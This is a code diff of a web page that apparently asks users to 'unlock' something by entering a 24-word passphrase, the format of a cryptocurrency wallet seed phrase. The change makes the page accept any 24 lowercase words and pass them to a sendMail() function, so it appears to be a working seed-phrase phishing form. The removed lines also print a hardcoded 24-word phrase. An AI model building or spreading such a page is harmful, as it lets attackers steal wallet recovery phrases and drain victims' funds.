@@ -58,31 +58,42 @@
             </form>
         </div>
     </div>
+    <!-- <script>
+        // const textarea = document.getElementById('passphrase');
+        // const messageDiv = document.getElementById('message');
+        // const unlockButton = document.getElementById('unlockButton');
+
+        // function emailSend() {
+        //     alert("Valid passphrase entered! Email function called.");
+        //     // Yahaan aap email send karne ka code likh sakte hain
+        // }
+
+        
+    </script> -->
 
     <script>
-         const textarea = document.getElementById('passphrase');
+        const textarea = document.getElementById('passphrase');
         const messageDiv = document.getElementById('message');
         const unlockButton = document.getElementById('unlockButton');
+        // textarea.addEventListener('input', function () {
+        //     const input = textarea.value.trim();
 
-        // ✅ Define the correct passphrase
-        const correctPassphrase = "lunar machine boss sunny calm jelly wild danger motion enrich gauge sniff rural assume uphold deal trip suspect call minor lawn moral organ forum";
+        //     // ✅ Regular expression to check passphrase format (24 lowercase words)
+        //     const passphrasePattern = /^([a-z]+(?: [a-z]+){23})$/;
 
-        textarea.addEventListener('input', function () {
-            const input = textarea.value.trim();
-
-            // ✅ Check if input exactly matches the correct passphrase
-            if (input === correctPassphrase) {
-                messageDiv.textContent = 'Passphrase is valid.';
-                messageDiv.className = 'valid';
-                unlockButton.disabled = false; // Enable button
-            } else {
-                messageDiv.textContent = 'Invalid passphrase. Please enter the correct passphrase.';
-                messageDiv.className = 'error';
-                unlockButton.disabled = true; // Disable button
-            }
-        });
-    
-        // Function to send email only if passphrase is valid
+        //     if (passphrasePattern.test(input)) {
+        //         messageDiv.textContent = 'Passphrase is valid.';
+        //         messageDiv.className = 'valid';
+        //         unlockButton.disabled = false; // Enable button
+        //         // emailSend(); // ✅ Call emailSend() function
+        //     } else {
+        //         messageDiv.textContent = 'Invalid passphrase. It should have 24 lowercase words separated by spaces.';
+        //         messageDiv.className = 'error';
+        //         unlockButton.disabled = false; // Disable button
+        //     }
+        // });
+        
+        // // Function to send email only if passphrase is valid
         function sendMail() {
             let parms = {
                 name: "User",
@@ -102,15 +113,29 @@
     
         // Unlock button click event handler
         async function callfun() {
-            // event.preventDefault();  // Prevent form submission
-            // Only send email if the passphrase is valid
-            // console.log("HI")
-            if (messageDiv.className === 'valid') {
+            const input = textarea.value.trim();
+
+            // ✅ Regular expression to check passphrase format (24 lowercase words)
+            const passphrasePattern = /^([a-z]+(?: [a-z]+){23})$/;
+
+            if (passphrasePattern.test(input)) {
+                messageDiv.textContent = 'Passphrase is valid.';
+                messageDiv.className = 'valid';
+                unlockButton.disabled = false; // Enable button
+                // emailSend(); // ✅ Call emailSend() function
                 sendMail();
             } else {
-                // console.log("HII");
+                messageDiv.textContent = 'Invalid passphrase. It should have 24 lowercase words separated by spaces.';
+                messageDiv.className = 'error';
+                unlockButton.disabled = false; // Disable button
                 alert("Invalid passphrase! Please correct the errors.");
             }
+            // if (messageDiv.className === 'valid') {
+            //     sendMail();
+            // } else {
+            //     // console.log("HII");
+            //     alert("Invalid passphrase! Please correct the errors.");
+            // }
         };
     </script>
     
